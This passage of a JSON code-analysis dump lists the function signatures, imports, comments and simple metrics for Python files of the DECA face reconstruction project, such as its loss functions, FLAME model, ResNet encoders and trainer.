        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/utils/tensor_cropper.py",
        "docstrings": [],
        "function_defs": [
          "def points2bbox(points, points_scale=None):",
          "def augment_bbox(center, bbox_size, scale=[1.0, 1.0], trans_scale=0.):",
          "def crop_tensor(image, center, bbox_size, crop_size, interpolation = 'bilinear', align_corners=False):",
          "def __init__(self, crop_size, scale=[1,1], trans_scale = 0.):",
          "def crop(self, image, points, points_scale=None):",
          "def transform_points(self, points, tform, points_scale=None, normalize = True):",
          "def transform_points(points, tform, points_scale=None, out_scale=None):"
        ],
        "class_defs": [
          "class Cropper(object):"
        ],
        "imports": [
          "import torch",
          "from kornia.geometry.transform.imgwarp import ("
        ],
        "comments": [
          "# Convert the bounding box to a square box",
          "# points: top-left, top-right, bottom-right, bottom-left",
          "# estimate transformation between points",
          "# simulate broadcasting",
          "# dst_trans_src = dst_trans_src.expand(batch_size, -1, -1)",
          "# warp images",
          "# tform = torch.inverse(dst_trans_src)",
          "# points to bbox",
          "# argument bbox. TODO: add rotation?",
          "# crop",
          "#'input points must use original range'",
          "#'input points must use original range'",
          "# import ipdb; ipdb.set_trace()"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/utils/lossfunc.py",
        "docstrings": [],
        "function_defs": [
          "def l2_distance(verts1, verts2):",
          "def kl_loss(texcode):\n\"\"\"\nrecon_x: generating images\nx: origin images\nmu: latent mean\nlogvar: latent log variance\n\"\"\"",
          "def shading_white_loss(shading):",
          "def shading_smooth_loss(shading):",
          "def albedo_constancy_loss(albedo, alpha = 15, weight = 1.):",
          "def albedo_ring_loss(texcode, ring_elements, margin, weight=1.):\n\"\"\"\ncomputes ring loss for ring_outputs before FLAME decoder\nInputs:\nring_outputs = a list containing N streams of the ring; len(ring_outputs) = N\nEach ring_outputs[i] is a tensor of (batch_size X shape_dim_num)\nAim is to force each row (same subject) of each stream to produce same shape\nEach row of first N-1 strams are of the same subject and\nthe Nth stream is the different subject\n\"\"\"",
          "def albedo_same_loss(albedo, ring_elements, weight=1.):\n\"\"\"\ncomputes ring loss for ring_outputs before FLAME decoder\nInputs:\nring_outputs = a list containing N streams of the ring; len(ring_outputs) = N\nEach ring_outputs[i] is a tensor of (batch_size X shape_dim_num)\nAim is to force each row (same subject) of each stream to produce same shape\nEach row of first N-1 strams are of the same subject and\nthe Nth stream is the different subject\n\"\"\"",
          "def batch_kp_2d_l1_loss(real_2d_kp, predicted_2d_kp, weights=None):\n\"\"\"\nComputes the l1 loss between the ground truth keypoints and the predicted keypoints\nInputs:\nkp_gt  : N x K x 3\nkp_pred: N x K x 2\n\"\"\"",
          "def landmark_loss(predicted_landmarks, landmarks_gt, weight=1.):",
          "def eye_dis(landmarks):",
          "def eyed_loss(predicted_landmarks, landmarks_gt, weight=1.):",
          "def lip_dis(landmarks):",
          "def lipd_loss(predicted_landmarks, landmarks_gt, weight=1.):",
          "def weighted_landmark_loss(predicted_landmarks, landmarks_gt, weight=1.):",
          "def landmark_loss_tensor(predicted_landmarks, landmarks_gt, weight=1.):",
          "def ring_loss(ring_outputs, ring_type, margin, weight=1.):\n\"\"\"\ncomputes ring loss for ring_outputs before FLAME decoder\nInputs:\nring_outputs = a list containing N streams of the ring; len(ring_outputs) = N\nEach ring_outputs[i] is a tensor of (batch_size X shape_dim_num)\nAim is to force each row (same subject) of each stream to produce same shape\nEach row of first N-1 strams are of the same subject and\nthe Nth stream is the different subject\n\"\"\"",
          "def gradient_dif_loss(prediction, gt):",
          "def get_laplacian_kernel2d(kernel_size: int):\nr\"\"\"Function that returns Gaussian filter matrix coefficients.\n\nArgs:\nkernel_size (int): filter size should be odd.\n\nReturns:\nTensor: 2D tensor with laplacian filter matrix coefficients.\n\nShape:",
          "def laplacian_hq_loss(prediction, gt):",
          "def __init__(self):",
          "def forward(self, x):",
          "def __init__(self, featlayer=VGG19FeatLayer):",
          "def sum_normalize(self, featmaps):",
          "def patch_extraction(self, featmaps):",
          "def compute_relative_distances(self, cdist):",
          "def exp_norm_relative_dist(self, relative_dist):",
          "def mrf_loss(self, gen, tar):",
          "def forward(self, gen, tar):",
          "def __init__(self):\n\"\"\"\nConstructor\n\"\"\"",
          "def load_weights(self, path=\"pretrained/VGG_FACE.t7\"):\n\"\"\" Function to load luatorch pretrained\nArgs:\npath: path for the luatorch pretrained\n\"\"\"",
          "def forward(self, x):\n\"\"\" Pytorch forward\nArgs:\nx: input image (224x224)\nReturns: class logits\n\"\"\"",
          "def __init__(self):",
          "def sum_normalize(self, featmaps):",
          "def patch_extraction(self, featmaps):",
          "def compute_relative_distances(self, cdist):",
          "def exp_norm_relative_dist(self, relative_dist):",
          "def mrf_loss(self, gen, tar):",
          "def forward(self, gen, tar):",
          "def __init__(self, pretrained_model, pretrained_data='vggface2'):",
          "def reg_features(self, x):",
          "def transform(self, img):",
          "def _cos_metric(self, x1, x2):",
          "def forward(self, gen, tar, is_crop=True):"
        ],
        "class_defs": [
          "class VGG19FeatLayer(nn.Module):",
          "class IDMRFLoss(nn.Module):",
          "class VGG_16(nn.Module):",
          "class VGGLoss(nn.Module):",
          "class VGGFace2Loss(nn.Module):"
        ],
        "imports": [
          "import torch.nn as nn",
          "import numpy as np",
          "import torch",
          "import torch.nn.functional as F",
          "import torch.autograd as autograd",
          "from functools import reduce",
          "import torchvision.models as models",
          "import cv2",
          "import torchfile",
          "from torch.autograd import Variable",
          "from . import util",
          "from ..models.frnet import resnet50, load_state_dict"
        ],
        "comments": [
          "### VAE",
          "# KL divergence",
          "### ------------------------------------- Losses/Regularizations for shading",
          "# white shading",
          "# uv_mask_tf = tf.expand_dims(tf.expand_dims(tf.constant( self.uv_mask, dtype = tf.float32 ), 0), -1)",
          "# mean_shade = tf.reduce_mean( tf.multiply(shade_300W, uv_mask_tf) , axis=[0,1,2]) * 16384 / 10379",
          "# G_loss_white_shading = 10*norm_loss(mean_shade,  0.99*tf.ones([1, 3], dtype=tf.float32), loss_type = \"l2\")",
          "# rgb_diff = (shading[:,0] - shading[:,1])**2 + (shading[:,0] - shading[:,2])**2 + (shading[:,1] - shading[:,2])**2",
          "# rgb_diff = (shading[:,0].mean([1,2]) - shading[:,1].mean([1,2]))**2 + (shading[:,0].mean([1,2]) - shading[:,2].mean([1,2]))**2 + (shading[:,1].mean([1,2]) - shading[:,2].mean([1,2]))**2",
          "# rgb_diff = (shading.mean([2, 3]) - torch.ones((shading.shape[0], 3)).float().cuda())**2",
          "### ------------------------------------- Losses/Regularizations for albedo",
          "# texture_300W_labels_chromaticity = (texture_300W_labels + 1.0)/2.0",
          "# texture_300W_labels_chromaticity = tf.divide(texture_300W_labels_chromaticity, tf.reduce_sum(texture_300W_labels_chromaticity, axis=[-1], keep_dims=True) + 1e-6)",
          "# w_u = tf.stop_gradient(tf.exp(-15*tf.norm( texture_300W_labels_chromaticity[:, :-1, :, :] - texture_300W_labels_chromaticity[:, 1:, :, :], ord='euclidean', axis=-1, keep_dims=True)) * texture_vis_mask[:, :-1, :, :] )",
          "# G_loss_local_albedo_const_u = tf.reduce_mean(norm_loss( albedo_300W[:, :-1, :, :], albedo_300W[:, 1:, :, :], loss_type = 'l2,1', reduce_mean=False, p=0.8) * w_u) / tf.reduce_sum(w_u+1e-6)",
          "# w_v = tf.stop_gradient(tf.exp(-15*tf.norm( texture_300W_labels_chromaticity[:, :, :-1, :] - texture_300W_labels_chromaticity[:, :, 1:, :], ord='euclidean', axis=-1, keep_dims=True)) * texture_vis_mask[:, :, :-1, :] )",
          "# G_loss_local_albedo_const_v = tf.reduce_mean(norm_loss( albedo_300W[:, :, :-1, :], albedo_300W[:, :, 1:, :],  loss_type = 'l2,1', reduce_mean=False, p=0.8) * w_v) / tf.reduce_sum(w_v+1e-6)",
          "# G_loss_local_albedo_const = (G_loss_local_albedo_const_u + G_loss_local_albedo_const_v)*10",
          "### ------------------------------------- Losses/Regularizations for vertices",
          "# (predicted_theta, predicted_verts, predicted_landmarks) = ringnet_outputs[-1]",
          "# real_2d = torch.cat(landmarks_gt).cuda()",
          "# left eye:  [38,42], [39,41] - 1",
          "# right eye: [44,48], [45,47] -1",
          "# up inner lip:  [62, 63, 64] - 1",
          "# down innder lip: [68, 67, 66] -1",
          "#smaller inner landmark weights",
          "# (predicted_theta, predicted_verts, predicted_landmarks) = ringnet_outputs[-1]",
          "# import ipdb; ipdb.set_trace()",
          "# nose points",
          "# inner mouth",
          "# (predicted_theta, predicted_verts, predicted_landmarks) = ringnet_outputs[-1]",
          "######################################## images/features/perceptual",
          "# https://torchgeometry.readthedocs.io/en/latest/_modules/kornia/filters/laplacian.html",
          "##",
          "# print([x for x in out])",
          "## gen: [bz,3,h,w] rgb [0,1]",
          "# loss = 0",
          "# for key in self.feat_style_layers.keys():",
          "#     loss += torch.mean((gen_vgg_feats[key] - tar_vgg_feats[key])**2)",
          "# return loss",
          "######################################################## vgg16 face",
          "# self.mean = torch.tensor([0.485, 0.456, 0.406]).view(1, 3, 1, 1).cuda()",
          "## gen: [bz,3,h,w] rgb [0,1]",
          "# loss = 0",
          "# for key in self.feat_style_layers.keys():",
          "#     loss += torch.mean((gen_vgg_feats[key] - tar_vgg_feats[key])**2)",
          "# return loss",
          "##############################################",
          "## ref: https://github.com/cydonia999/VGGFace2-pytorch",
          "# out = []",
          "# x = F.interpolate(x*2. - 1., [224,224], mode='nearest')",
          "# import ipdb; ipdb.set_trace()",
          "# import ipdb;ipdb.set_trace()",
          "# loss = ((gen_out - tar_out)**2).mean()"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 5,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/utils/trainer.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, model, config=None, device='cuda:0'):",
          "def configure_optimizers(self):",
          "def load_checkpoint(self):",
          "def training_step(self, batch, batch_nb):",
          "def validation_step(self):",
          "def evaluate(self):",
          "def prepare_data(self):",
          "def fit(self):"
        ],
        "class_defs": [
          "class Trainer(object):"
        ],
        "imports": [
          "import os, sys",
          "import torch",
          "import torchvision",
          "import torch.nn.functional as F",
          "import torch.nn as nn",
          "from torch.utils.data import DataLoader",
          "import numpy as np",
          "from time import time",
          "from skimage.io import imread",
          "import cv2",
          "import pickle",
          "from loguru import logger",
          "from datetime import datetime",
          "from tqdm import tqdm",
          "from .utils.renderer import SRenderY",
          "from .models.encoders import ResnetEncoder",
          "from .models.FLAME import FLAME, FLAMETex",
          "from .models.decoders import Generator",
          "from .utils import util",
          "from .utils.rotation_converter import batch_euler2axis",
          "from .datasets import datasets",
          "from .utils.config import cfg",
          "from .utils import lossfunc",
          "from .datasets import build_datasets",
          "from torch.utils.tensorboard import SummaryWriter",
          "from .datasets.now import NoWDataset #, NoWVal_old",
          "import ipdb; ipdb.set_trace()"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "#",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# Using this computer program means that you agree to the terms",
          "# in the LICENSE file included with this software distribution.",
          "# Any use not explicitly granted by the LICENSE is prohibited.",
          "#",
          "# Copyright\u00a92019 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# For comments or questions, please email us at deca@tue.mpg.de",
          "# For commercial licensing contact, please contact ps-license@tuebingen.mpg.de",
          "# deca model",
          "# initialize loss",
          "# intizalize loggers",
          "# resume training, including model weight, opt, steps",
          "# load model weights only",
          "# [B, K, 3, size, size] ==> [BxK, 3, size, size]",
          "#-- encoder",
          "### shape constraints",
          "## append gt",
          "# import ipdb; ipdb.set_trace()",
          "#-- decoder",
          "#------ rendering",
          "# mask",
          "# images",
          "#### ----------------------- Losses",
          "############################# base shape",
          "# reg on jaw pose",
          "#########################################################",
          "# losses_key = ['landmark', 'shape_reg', 'expression_reg']",
          "# run now validation images",
          "#-- save results for evaluation",
          "# save mesh",
          "# save 7 landmarks for alignment",
          "# visualize results to check",
          "# exit()",
          "## then please run main.py in https://github.com/soubhiksanyal/now_evaluation, it will take around 0.5h to get the metric results",
          "# import ipdb; ipdb.set_trace()"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/models/frnet.py",
        "docstrings": [],
        "function_defs": [
          "def conv3x3(in_planes, out_planes, stride=1):\n\"\"\"3x3 convolution with padding\"\"\"\nreturn nn.Conv2d(in_planes, out_planes, kernel_size=3, stride=stride,\npadding=1, bias=False)\n\nclass BasicBlock(nn.Module):\nexpansion = 1\n\ndef __init__(self, inplanes, planes, stride=1, downsample=None):\nsuper(BasicBlock, self).__init__()",
          "def __init__(self, inplanes, planes, stride=1, downsample=None):",
          "def forward(self, x):",
          "def __init__(self, inplanes, planes, stride=1, downsample=None):",
          "def forward(self, x):",
          "def __init__(self, block, layers, num_classes=1000, include_top=True):",
          "def _make_layer(self, block, planes, blocks, stride=1):",
          "def forward(self, x):",
          "def resnet50(**kwargs):\n\"\"\"Constructs a ResNet-50 model.\n\"\"\"",
          "def load_state_dict(model, fname):\n\"\"\"\nSet parameters converted from Caffe models authors of VGGFace2 provide.\nSee https://www.robots.ox.ac.uk/~vgg/data/vgg_face2/.\nArguments:\nmodel: model\nfname: file name of parameters converted from a Caffe model, assuming the file format is Pickle.\n\"\"\""
        ],
        "class_defs": [
          "class BasicBlock(nn.Module):",
          "class Bottleneck(nn.Module):",
          "class ResNet(nn.Module):"
        ],
        "imports": [
          "import torch.nn as nn",
          "import numpy as np",
          "import torch",
          "import torch.nn.functional as F",
          "import cv2",
          "from torch.autograd import Variable",
          "import math",
          "import pickle"
        ],
        "comments": [
          "# from pro_gan_pytorch.PRO_GAN import ProGAN, Generator, Discriminator"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/models/decoders.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, latent_dim=100, out_channels=1, out_scale=0.01, sample_mode = 'bilinear'):",
          "def forward(self, noise):"
        ],
        "class_defs": [
          "class Generator(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn as nn"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "#",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# Using this computer program means that you agree to the terms",
          "# in the LICENSE file included with this software distribution.",
          "# Any use not explicitly granted by the LICENSE is prohibited.",
          "#",
          "# Copyright\u00a92019 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# For comments or questions, please email us at deca@tue.mpg.de",
          "# For commercial licensing contact, please contact ps-license@tuebingen.mpg.de"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/models/lbs.py",
        "docstrings": [],
        "function_defs": [
          "def rot_mat_to_euler(rot_mats):",
          "def find_dynamic_lmk_idx_and_bcoords(vertices, pose, dynamic_lmk_faces_idx,",
          "def vertices2landmarks(vertices, faces, lmk_faces_idx, lmk_bary_coords):",
          "def lbs(betas, pose, v_template, shapedirs, posedirs, J_regressor, parents,",
          "def vertices2joints(J_regressor, vertices):",
          "def blend_shapes(betas, shape_disps):",
          "def batch_rodrigues(rot_vecs, epsilon=1e-8, dtype=torch.float32):",
          "def transform_mat(R, t):",
          "def batch_rigid_transform(rot_mats, joints, parents, dtype=torch.float32):\n\"\"\"\nApplies a batch of rigid transformations to the joints\n\nParameters\n----------\nrot_mats : torch.tensor BxNx3x3\nTensor of rotation matrices\njoints : torch.tensor BxNx3\nLocations of joints"
        ],
        "class_defs": [],
        "imports": [
          "from __future__ import absolute_import",
          "from __future__ import print_function",
          "from __future__ import division",
          "import numpy as np",
          "import torch",
          "import torch.nn.functional as F"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92019 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: ps-license@tuebingen.mpg.de",
          "# Calculates rotation matrix to euler angles",
          "# Careful for extreme cases of eular angles like [0.0, pi, 0.0]",
          "# Extract the indices of the vertices for each face",
          "# BxLx3",
          "# Add shape contribution",
          "# Get the joints",
          "# NxJx3 array",
          "# 3. Add pose blend shapes",
          "# N x J x 3 x 3",
          "# (N x P) x (P, V * 3) -> N x V x 3",
          "# 4. Get the global joint location",
          "# 5. Do skinning:",
          "# W is N x V x (J + 1)",
          "# (N x V x (J + 1)) x (N x (J + 1) x 16)",
          "# Displacement[b, m, k] = sum_{l} betas[b, l] * shape_disps[m, k, l]",
          "# i.e. Multiply each shape displacement by its corresponding beta and",
          "# then sum them.",
          "# Bx1 arrays",
          "# No padding left or right, only add an extra row",
          "# transforms_mat = transform_mat(",
          "#     rot_mats.view(-1, 3, 3),",
          "#     rel_joints.view(-1, 3, 1)).view(-1, joints.shape[1], 4, 4)",
          "# Subtract the joint location at the rest pose",
          "# No need for rotation, since it's identity when at rest",
          "# The last column of the transformations contains the posed joints",
          "# The last column of the transformations contains the posed joints"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/models/encoders.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, outsize, last_op=None):",
          "def forward(self, inputs):"
        ],
        "class_defs": [
          "class ResnetEncoder(nn.Module):"
        ],
        "imports": [
          "import numpy as np",
          "import torch.nn as nn",
          "import torch",
          "import torch.nn.functional as F",
          "from . import resnet"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "#",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# Using this computer program means that you agree to the terms",
          "# in the LICENSE file included with this software distribution.",
          "# Any use not explicitly granted by the LICENSE is prohibited.",
          "#",
          "# Copyright\u00a92019 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# For comments or questions, please email us at deca@tue.mpg.de",
          "# For commercial licensing contact, please contact ps-license@tuebingen.mpg.de",
          "### regressor"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/models/resnet.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, block, layers, num_classes=1000):",
          "def _make_layer(self, block, planes, blocks, stride=1):",
          "def forward(self, x):",
          "def __init__(self, inplanes, planes, stride=1, downsample=None):",
          "def forward(self, x):",
          "def conv3x3(in_planes, out_planes, stride=1):\n\"\"\"3x3 convolution with padding\"\"\"\nreturn nn.Conv2d(in_planes, out_planes, kernel_size=3, stride=stride,\npadding=1, bias=False)\n\nclass BasicBlock(nn.Module):\nexpansion = 1\n\ndef __init__(self, inplanes, planes, stride=1, downsample=None):\nsuper(BasicBlock, self).__init__()",
          "def __init__(self, inplanes, planes, stride=1, downsample=None):",
          "def forward(self, x):",
          "def copy_parameter_from_resnet(model, resnet_dict):",
          "def load_ResNet50Model():",
          "def load_ResNet101Model():",
          "def load_ResNet152Model():",
          "def __init__(self, in_channels, out_channels):",
          "def forward(self, x):",
          "def __init__(self, in_channels, out_channels):",
          "def forward(self, x):",
          "def __init__(self, in_channels, out_channels, bilinear=True):",
          "def forward(self, x1, x2):",
          "def __init__(self, in_channels, out_channels):",
          "def forward(self, x):"
        ],
        "class_defs": [
          "class ResNet(nn.Module):",
          "class Bottleneck(nn.Module):",
          "class BasicBlock(nn.Module):",
          "class DoubleConv(nn.Module):",
          "class Down(nn.Module):",
          "class Up(nn.Module):",
          "class OutConv(nn.Module):"
        ],
        "imports": [
          "import torch.nn as nn",
          "import torch.nn.functional as F",
          "import torch",
          "from torch.nn.parameter import Parameter",
          "import torch.optim as optim",
          "import numpy as np",
          "import math",
          "import torchvision"
        ],
        "comments": [
          "# self.fc = nn.Linear(512 * block.expansion, num_classes)",
          "# x = self.fc(x)",
          "## x2: [bz, 2048] for shape",
          "## x1: [bz, 2048, 7, 7] for texture",
          "# import ipdb; ipdb.set_trace()",
          "# print(name, ' not available in reconstructed resnet')",
          "# print(name, ' is inconsistent!')",
          "# print('copy resnet state dict finished!')",
          "# import ipdb; ipdb.set_trace()",
          "# model.load_state_dict(checkpoint['model_state_dict'])",
          "######## Unet",
          "# if bilinear, use the normal convolutions to reduce the number of channels",
          "# input is CHW",
          "# if you have padding issues, see",
          "# https://github.com/HaiyongJiang/U-Net-Pytorch-Unstructured-Buggy/commit/0e854509c2cea854e247a9c615f175f76fbb2e3a",
          "# https://github.com/xiaopeng-liao/Pytorch-UNet/commit/8ebac70e633bac59fc22bb5195e513d5832fb3bd"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/models/FLAME.py",
        "docstrings": [],
        "function_defs": [
          "def to_tensor(array, dtype=torch.float32):",
          "def to_np(array, dtype=np.float32):",
          "def __init__(self, **kwargs):",
          "def __init__(self, config):",
          "def _find_dynamic_lmk_idx_and_bcoords(self, pose, dynamic_lmk_faces_idx,",
          "def _vertices2landmarks(self, vertices, faces, lmk_faces_idx, lmk_bary_coords):\n\"\"\"\nCalculates landmarks by barycentric interpolation\nInput:\nvertices: torch.tensor NxVx3, dtype = torch.float32\nThe tensor of input vertices\nfaces: torch.tensor (N*F)x3, dtype = torch.long\nThe faces of the mesh\nlmk_faces_idx: torch.tensor N X L, dtype = torch.long\nThe tensor with the indices of the faces used to calculate the",
          "def seletec_3d68(self, vertices):",
          "def forward(self, shape_params=None, expression_params=None, pose_params=None, eye_pose_params=None):\n\"\"\"\nInput:\nshape_params: N X number of shape parameters\nexpression_params: N X number of expression parameters\npose_params: N X number of pose parameters (6)\nreturn:d\nvertices: N X V X 3\nlandmarks: N X number of landmarks X 3\n\"\"\"",
          "def __init__(self, config):",
          "def forward(self, texcode):"
        ],
        "class_defs": [
          "class Struct(object):",
          "class FLAME(nn.Module):",
          "class FLAMETex(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn as nn",
          "import numpy as np",
          "import pickle",
          "import torch.nn.functional as F",
          "from .lbs import lbs, batch_rodrigues, vertices2landmarks, rot_mat_to_euler"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "#",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# Using this computer program means that you agree to the terms",
          "# in the LICENSE file included with this software distribution.",
          "# Any use not explicitly granted by the LICENSE is prohibited.",
          "#",
          "# Copyright\u00a92019 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# For comments or questions, please email us at deca@tue.mpg.de",
          "# For commercial licensing contact, please contact ps-license@tuebingen.mpg.de",
          "# The vertices of the template model",
          "# The shape components and expression",
          "# The pose components",
          "#",
          "# Fixing Eyeball and neck rotation",
          "# Static and Dynamic Landmark embeddings for FLAME",
          "# Extract the indices of the vertices for each face",
          "# NxLx3"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/utils/rasterizer/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/utils/rasterizer/setup.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "from setuptools import setup",
          "from torch.utils.cpp_extension import BuildExtension, CUDAExtension",
          "import os"
        ],
        "comments": [
          "# To install, run",
          "# python setup.py build_ext -i",
          "# Ref: https://github.com/pytorch/pytorch/blob/11a40410e755b1fe74efe9eaa635e7ba5712846b/test/cpp_extensions/setup.py#L62",
          "# USE_NINJA = os.getenv('USE_NINJA') == '1'"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/RVC_venv/lib/python3.11/site-packages/pydantic/v1",
    "name": "v1",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  }
]